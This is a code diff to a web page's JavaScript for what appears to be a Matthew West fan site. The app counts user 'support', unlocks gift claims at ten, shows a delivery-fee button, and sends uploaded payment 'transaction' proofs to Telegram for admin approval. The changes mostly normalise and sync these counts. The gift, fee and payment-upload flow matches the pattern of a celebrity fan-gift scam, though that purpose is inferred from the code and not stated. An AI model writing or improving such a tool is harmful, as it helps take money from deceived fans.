@@ -1122,7 +1122,7 @@
 
       <div class="popup-overlay" id="appPopup" role="dialog" aria-modal="true" aria-labelledby="popupTitle">
         <div class="popup-card">
-          <div class="popup-icon">✓</div>
+          <div class="popup-icon" id="popupIcon">✓</div>
           <h2 id="popupTitle"></h2>
           <p id="popupMessage"></p>
           <button class="popup-close-button" id="popupCloseButton" type="button">Close</button>
@@ -1156,8 +1156,37 @@
       let pendingAccount = null;
       let pendingLoginAccount = null;
 
+      function supportFloor(value) {
+        return Math.max(Number(value || 0), 5);
+      }
+
+      function normalizeAccount(account) {
+        if (!account) return account;
+        account.supportCount = supportFloor(account.supportCount);
+        account.voteCount = Number(account.voteCount || 0);
+        account.claimedGifts = account.claimedGifts || [];
+        account.supportHistory = account.supportHistory || [];
+        account.pendingUploads = account.pendingUploads || [];
+        account.deliveryFeePaid = Boolean(account.deliveryFeePaid);
+        return account;
+      }
+
       function getAccounts() {
-        return JSON.parse(localStorage.getItem(accountKey) || "[]");
+        const accounts = JSON.parse(localStorage.getItem(accountKey) || "[]");
+        let changed = false;
+
+        const normalizedAccounts = accounts.map((account) => {
+          const before = Number(account.supportCount || 0);
+          normalizeAccount(account);
+          if (before !== account.supportCount) changed = true;
+          return account;
+        });
+
+        if (changed) {
+          saveAccounts(normalizedAccounts);
+        }
+
+        return normalizedAccounts;
       }
 
       function saveAccounts(accounts) {
@@ -1188,7 +1217,6 @@
         element.className = `message${type ? ` is-${type}` : ""}`;
       }
 
-
       function showPopup(title, message, type = "success") {
         popupTitle.textContent = title;
         popupMessage.textContent = message;
@@ -1200,7 +1228,6 @@
       function closePopup() {
         appPopup.classList.remove("is-active");
       }
-
 
       async function sendUploadToTelegram({ file, caption, uploadType, transaction = "" }) {
         if (!currentAccountEmail) {
@@ -1230,6 +1257,8 @@
 
       async function registerAccountToBackend(account) {
         if (!account || !account.email) return;
+        normalizeAccount(account);
+
         try {
           await fetch(`${backendConfig.apiBase}/api/account`, {
             method: "POST",
@@ -1237,8 +1266,8 @@
             body: JSON.stringify({
               email: account.email,
               name: account.name,
-              supportCount: account.supportCount || 5,
-              voteCount: account.voteCount || 0
+              supportCount: supportFloor(account.supportCount),
+              voteCount: Number(account.voteCount || 0)
             })
           });
         } catch (error) {
@@ -1260,8 +1289,8 @@
           const account = accounts.find((item) => item.email === currentAccountEmail);
           if (!account) return;
 
-          const backendSupport = Number(backendAccount.supportCount || 5);
-          const localSupport = Number(account.supportCount || 5);
+          const backendSupport = supportFloor(backendAccount.supportCount);
+          const localSupport = supportFloor(account.supportCount);
 
           if (backendSupport > localSupport) {
             account.supportCount = backendSupport;
@@ -1274,6 +1303,11 @@
             updateSupportDisplay(account);
             updateClaimButtons(account);
             showPopup("Support approved", "Admin accepted your upload. Your support number has been updated.", "success");
+          } else if (localSupport !== account.supportCount) {
+            account.supportCount = localSupport;
+            saveAccounts(accounts);
+            updateSupportDisplay(account);
+            updateClaimButtons(account);
           }
         } catch (error) {
           console.warn("Backend support sync skipped.", error);
@@ -1319,13 +1353,18 @@
         const account = accounts.find((item) => item.email === email);
         if (!account) return null;
         Object.assign(account, updates);
+        normalizeAccount(account);
         saveAccounts(accounts);
         return account;
       }
 
       function updateClaimButtons(account) {
+        normalizeAccount(account);
+
         const claimedGifts = account.claimedGifts || [];
-        const supportTotal = account.supportCount || 5;
+        const supportTotal = supportFloor(account.supportCount);
+        account.supportCount = supportTotal;
+
         const canClaim = supportTotal >= 10;
         claimButtons.forEach((button) => {
           const isClaimed = claimedGifts.includes(button.dataset.gift);
@@ -1335,16 +1374,22 @@
           button.textContent = isClaimed ? "Claimed" : canClaim ? "Claim gift" : "Locked";
           button.disabled = isClaimed;
         });
+
         claimedGiftsLine.textContent = claimedGifts.length ? claimedGifts.join(", ") : "None yet";
         deliveryFeeButton.classList.toggle("is-hidden", !canClaim || account.deliveryFeePaid);
       }
 
       function updateSupportDisplay(account) {
-        const total = account.supportCount || 5;
-        const votes = account.voteCount || 0;
+        normalizeAccount(account);
+
+        const total = supportFloor(account.supportCount);
+        account.supportCount = total;
+
+        const votes = Number(account.voteCount || 0);
         const history = account.supportHistory || [];
         const latestSupport = history.length ? history[history.length - 1].at : "";
         const latestMethod = history.length ? history[history.length - 1].reason : "";
+
         supportCount.textContent = total;
         giftSupportCount.textContent = total;
         profileSupportCount.textContent = `${total} times`;
@@ -1367,16 +1412,18 @@
         const account = accounts.find((item) => item.email === currentAccountEmail);
         if (!account) return null;
 
-        account.supportCount = (account.supportCount || 5) + 1;
+        account.supportCount = supportFloor(account.supportCount) + 1;
         account.supportHistory = account.supportHistory || [];
         account.supportHistory.push({
           reason,
           at: new Date().toLocaleString(),
           ...extra
         });
+
         saveAccounts(accounts);
         updateSupportDisplay(account);
         updateClaimButtons(account);
+        registerAccountToBackend(account);
         return account;
       }
 
@@ -1393,6 +1440,7 @@
           submittedAt: new Date().toLocaleString(),
           ...upload
         });
+
         saveAccounts(accounts);
         return account;
       }
@@ -1412,6 +1460,8 @@
       }
 
       function openDashboard(account) {
+        normalizeAccount(account);
+
         currentAccountEmail = account.email;
         saveSession(account.email);
         registerAccountToBackend(account);
@@ -1571,6 +1621,7 @@
 
           pendingAccount.phone = phone;
           pendingAccount.deliveryAddress = address;
+          normalizeAccount(pendingAccount);
 
           const accounts = getAccounts();
           accounts.push(pendingAccount);
@@ -1610,7 +1661,9 @@
               return;
             }
 
-            const supportTotal = account.supportCount || 5;
+            const supportTotal = supportFloor(account.supportCount);
+            account.supportCount = supportTotal;
+
             if (supportTotal < 10) {
               const remaining = 10 - supportTotal;
               showPopup(
@@ -1640,7 +1693,7 @@
             return;
           }
 
-          account.voteCount = (account.voteCount || 0) + 1;
+          account.voteCount = Number(account.voteCount || 0) + 1;
           updateAccount(currentAccountEmail, account);
           recordSupport("Vote in K-LOVE Fan Awards");
           showPopup("Vote recorded", "Thank you for voting for Matthew West!");
